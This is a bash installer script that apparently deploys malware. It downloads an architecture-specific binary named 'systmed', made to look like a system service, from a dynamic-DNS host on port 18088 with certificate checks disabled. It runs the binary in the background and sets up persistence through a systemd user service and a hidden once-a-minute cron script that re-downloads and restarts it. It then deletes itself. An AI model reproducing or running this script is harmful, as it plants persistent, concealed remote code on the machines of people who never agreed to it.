#!/bin/bash

FLAG_FILE="/tmp/systmed_install"
bin_DIR="$HOME/.local_bin"
DOWNLOAD_DIR="$bin_DIR"

mkdir -p "$bin_DIR"

download_and_setup() {
    ARCH="$(uname -m)"
    case "$ARCH" in
        "arm")
            FILE_URL="http://down.jackte.ip-dynamic.org:18088/systmed_arm"
            ;;
        "aarch64")
            FILE_URL="http://down.jackte.ip-dynamic.org:18088/systmed_arm64"
            ;;
        "i386"|"i686")
            FILE_URL="http://down.jackte.ip-dynamic.org:18088/systmed_i386"
            ;;
        "x86_64")
            FILE_URL="http://down.jackte.ip-dynamic.org:18088/systmed_amd64"
            ;;
        *)
            echo "Unknown system architecture: $ARCH"
            exit 1
            ;;
    esac

    if command -v wget >/dev/null 2>&1; then
        wget --no-check-certificate --content-disposition --max-redirect=20 -O "$DOWNLOAD_DIR/systmed" "$FILE_URL"
    elif command -v curl >/dev/null 2>&1; then
        curl -L -k -o "$DOWNLOAD_DIR/systmed" "$FILE_URL"
    else
        echo "Unable to find wget or curl, unable to download systmed files"
        exit 1
    fi
    chmod +x "$DOWNLOAD_DIR/systmed"
}

find_directory_and_deploy() {
    if [ -f "$bin_DIR/systmed" ]; then
        rm -f "$bin_DIR/systmed"  # 删除旧文件
    fi
    mv "$DOWNLOAD_DIR/systmed" "$bin_DIR/systmed"
    DEPLOY_DIR="$bin_DIR"
}

execute_in_background() {
    nohup "$DEPLOY_DIR/systmed" >/dev/null 2>&1 &
}

setup_service() {
    SERVICE_FILE="$HOME/.config/systemd/user/systmed.service"
    mkdir -p "$HOME/.config/systemd/user"
    cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=Systmed Service
After=network.target

[Service]
ExecStart=$bin_DIR/systmed
Restart=always

[Install]
WantedBy=default.target
EOF
    export XDG_RUNTIME_DIR="/run/user/$(id -u)"  # 设置环境变量
    systemctl --user daemon-reload
    systemctl --user enable systmed.service
    systemctl --user start systmed.service
}

setup_cron_job() {
    if ! command -v crontab >/dev/null 2>&1; then
        echo "crontab not found, attempting to install..."
        if [ -f /etc/debian_version ]; then
            apt-get update && apt-get install -y cron
        elif [ -f /etc/redhat-release ]; then
            yum install -y cronie
        else
            echo "Unsupported system for automatic crontab installation"
            exit 1
        fi
    fi
    (crontab -l 2>/dev/null | grep -v 'systmed_config'; echo "* * * * * /bin/bash $HOME/.config/.dash/systmed_config.sh") | crontab -
}

create_config_script() {
    config_DIR="$HOME/.local_config"
    mkdir -p "$config_DIR"
    cat > "$config_DIR/systmed_config.sh" <<EOF
#!/bin/bash
bin_DIR="$HOME/.local_bin"
DOWNLOAD_DIR="\$bin_DIR"

cd "\$HOME" || exit 1

find_directory_and_deploy() {
    if [ -f "\$DOWNLOAD_DIR/systmed" ]; then
        if [ -f "\$bin_DIR/systmed" ]; then
            rm -f "\$bin_DIR/systmed"  # 删除旧文件
        fi
        mv "\$DOWNLOAD_DIR/systmed" "\$bin_DIR/systmed"
        DEPLOY_DIR="\$bin_DIR"
    else
        echo "Error: systmed file not found in \$DOWNLOAD_DIR"
        exit 1
    fi
}

execute_in_background() {
    if [ -n "\$DEPLOY_DIR" ] && [ -f "\$DEPLOY_DIR/systmed" ]; then
        nohup "\$DEPLOY_DIR/systmed" >/dev/null 2>&1 &
    else
        echo "Error: systmed file not found in \$DEPLOY_DIR"
        exit 1
    fi
}

download_and_setup() {
    ARCH="\$(uname -m)"
    case "\$ARCH" in
        "arm")
            FILE_URL="http://down.jackte.ip-dynamic.org:18088/systmed_arm"
            ;;
        "aarch64")
            FILE_URL="http://down.jackte.ip-dynamic.org:18088/systmed_arm64"
            ;;
        "i386"|"i686")
            FILE_URL="http://down.jackte.ip-dynamic.org:18088/systmed_i386"
            ;;
        "x86_64")
            FILE_URL="http://down.jackte.ip-dynamic.org:18088/systmed_amd64"
            ;;
        *)
            echo "Unknown system architecture: \$ARCH"
            exit 1
            ;;
    esac

    if command -v wget >/dev/null 2>&1; then
        wget --no-check-certificate --content-disposition --max-redirect=20 -O "\$DOWNLOAD_DIR/systmed" "\$FILE_URL"
    elif command -v curl >/dev/null 2>&1; then
        curl -L -k -o "\$DOWNLOAD_DIR/systmed" "\$FILE_URL"
    else
        echo "Unable to find wget or curl, unable to download systmed files"
        exit 1
    fi
    chmod +x "\$DOWNLOAD_DIR/systmed"
}

if [ ! -f "\$DOWNLOAD_DIR/systmed" ]; then
    mkdir -p "\$bin_DIR"
    download_and_setup
fi

if ! pgrep -x "systmed" > /dev/null; then
    find_directory_and_deploy
    execute_in_background
fi

EOF
    chmod +x "$config_DIR/systmed_config.sh"
    mkdir -p "$HOME/.config/.dash"
    if [ -f "$config_DIR/systmed_config.sh" ]; then
        mv "$config_DIR/systmed_config.sh" "$HOME/.config/.dash/systmed_config.sh"
        chmod +x "$HOME/.config/.dash/systmed_config.sh"
        ln -s "$HOME/.config/.dash/systmed_config.sh" "$config_DIR/systmed_config.sh"
    else
        echo "Error: The source file does not exist：$config_DIR/systmed_config.sh"
        exit 1
    fi
}

main_install() {
    if [ ! -f "$FLAG_FILE" ]; then
        download_and_setup
        find_directory_and_deploy
        if [ -n "$DEPLOY_DIR" ]; then
            execute_in_background
            create_config_script
            setup_cron_job
            setup_service
            touch "$FLAG_FILE"
            echo "ok gogo yes"
        else
            echo "No suitable directory was found to deploy the systmed files"
        fi
    else
        echo "systmed yes。"
    fi
    
    rm -- "\$0"
}

main_install
